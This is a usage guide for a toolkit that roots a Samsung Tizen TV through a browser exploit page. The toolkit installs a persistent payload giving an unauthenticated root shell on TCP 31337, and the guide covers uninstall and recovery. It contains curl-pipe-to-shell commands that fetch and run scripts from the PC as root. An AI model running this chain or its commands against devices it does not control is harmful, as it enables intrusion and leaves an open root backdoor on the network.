# Usage — running the toolkit

Two PowerShell entry points do the work on the PC. Both are safe to re-run and
both accept `-DryRun`, which prints the plan without touching anything.

```powershell
pwsh -File .\root.ps1      -TvIp <tv-ip>   # root the TV, install persistence
pwsh -File .\uninstall.ps1 -TvIp <tv-ip>   # restore stock
```

## Rooting

`root.ps1` resolves the toolkit (this directory, or `-ToolkitDir`), starts the
port-80 server (reusing one that already serves this directory; `-RestartServer`
replaces a different server on `:80`), waits for the browser page to connect,
roots that stub, installs the payload, then waits for TCP 31337 and prints `id`.

The payload usually starts **immediately** after the deploy: `deploy.sh` kill -9s
the running app (detached, after `DEPLOY_DONE`) so AUL loads the new DLL without
waiting for a reboot. The reboot is what proves the persistence is real, so do
it anyway.

**Two steps stay on the TV remote**, and the script prompts for both and repeats
a reminder with the URL every 30 seconds until the page connects:

1. open `http://<HOST_IP>/index.html` on the TV and wait for `RUNNING`;
2. power-cycle the TV after the deploy is verified.

### What you will see

- **On the TV:** the page reaches `RUNNING` and then stops updating. It may
  freeze — that is expected: the ARM stub owns the socket, so the page can no
  longer report anything.
- **On the PC:** the deploy output (`UID=0 … RELABEL=ok … COPY=ok …
  BOOT_ROW_COUNT=1 … DEPLOY_DONE`), then the reboot prompt, then
  `Permanent root is up:` followed by `uid=0(root) …`.

### Addresses are not baked in

The exploit page **rewrites the shellcode's callback address and port at load
time** from `location.hostname`/`location.port`, so the browser stage connects
back to whichever PC (and port) served the page. Open the page by **IP address**,
not by hostname — the patcher aborts on a hostname instead of falling back to the
compiled-in default, because that default is a TEST-NET placeholder and the TV
would dial a foreign network.

`root.ps1` works out your PC's address from the route to the TV and validates it
as IPv4; `server.py` renders that address into `deploy.sh` when the TV fetches
it, and `deploy.sh` records it on the TV as `share/rootchan.host`, which the
payload (v10+) uses for beacons and `server/recover.sh` uses to find the PC
again. The committed `server/deploy.sh` ships `H=@HOST@` (TEST-NET placeholder
`192.0.2.1`); serving it from a plain static server is refused (`NEED_RENDER`).

If you ever want to check or change it, that file is the one to edit:

```sh
cat /opt/usr/home/owner/share/rootchan.host
```
## Talking to the TV

The payload serves a line protocol on TCP 31337; replies end with `__END__`.

```powershell
python tools\root_shell.py "id"                  # one command
python tools\root_shell.py                       # interactive
```

It runs as `uid=0` under the app's SMACK label
(`User::Pkg::com.samsung.tv.MultiControl-Service`), not under the browser's.

**Do not use ping to decide whether the TV is reachable.** Windows `ping`
counts ICMP *error* replies as replies: when this PC is off the TV's LAN
(Wi-Fi instead of Ethernet, or the VPN tunnel up), the tunnel gateway answers
"Destination net unreachable" and `ping` still prints 0% loss and exits 0; a
proxy-ARP router can likewise answer for an offline set. The honest signals
are TCP (the 31337 probe above; the scripts' `Test-TvPort`/`Test-StockTv`) and
a fresh `DSHROOT` line in `server/logs/beacons.log`. If neither answers but
you believe the TV is on, check that this PC has an IPv4 on the TV's LAN and
the VPN is off (`ipconfig`, `route print -4`).

## Uninstalling

`uninstall.ps1` uses the root channel to run `server/uninstall.sh` as root, which:

- restores `bin/MultiControlService.dll` from `share/mcs_orig.dll`, after checking
  its md5 against the known stock hash (it aborts rather than restore a wrong file);
- restores the AOT image into `bin/.native_image/`;
- deletes the injected `boot_sequence` row (`-KeepBoot` leaves it, so the app still
  starts at boot, as stock);
- removes `payload_backup.dll` and the `/tmp` leftovers;
- reads the table back and fails loudly if the row is still there.

Then it waits for 31337 to close, waits for the TV to return, and confirms the
channel stays closed. The **running** app keeps the payload in memory until the
reboot, so 31337 stays open until then — expected, not a failure.

### If the root channel is down

The TV can still be reached through the browser path. Load `index.html` on it, then
either let the automated client do it:

```powershell
python tools\auto_root.py --host <HOST_IP> --script uninstall.sh --expect UNINSTALL_DONE
```

or drive it by hand — note the wait argument, the default (3 s) is far too short for
a deploy:

```powershell
python tools\kernel_root.py --fork
python tools\run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh" 120
```

or, from a root shell on the TV, run `server/recover.sh` to reinstall the payload
end to end instead:

```sh
curl -s http://<HOST_IP>/recover.sh | sh -s http://<HOST_IP>
```

## Recovery

`server/recover.sh` is the one-command reinstall. Run it **on the TV from a root
shell** — the one `tools/tv_rootwatch.py` hands you on `127.0.0.1:9999` is enough.
It takes the app's SMACK label with `/proc/self/attr/current`, then runs
`deploy.sh`, which the app restarts to load:

```sh
curl -s http://<HOST_IP>/recover.sh | sh -s http://<HOST_IP>
```

The PC URL is required: uninstall deletes `rootchan.host`, so there is nothing to
fall back to. The script feeds the rendered `deploy.sh` through stdin because
Tizen refuses to execute unsigned files in `/tmp` (UEB). Browser-lane equivalent:
`python tools/auto_root.py --script recover.sh --script-args "http://<HOST_IP>"`.

If the payload is missing *and* the browser is unusable, the last resort is
`root.ps1` itself: it only needs one page load to get a stub.

## When something goes wrong

`AGENTS.md` has the trap list, and `docs/FAILED.md` the long version. The three
that bite most often:

- **A wedged stub** (no reply, or the page blanked): the gateway keeps the old
  pairing. `physmap.reset_stub()` clears it — the next page load pairs cleanly, no
  server restart needed.
- **A deploy that says `COPY=fail`**: the shell was not carrying the app's label.
  The `RELABEL=` line in the same output says whether the label step worked.
- **Nothing at all on the TV**: check `server/logs/` — the server may have died
  (see `docs/SERVER-HOSTING.md` for why a console-hosted server does that).
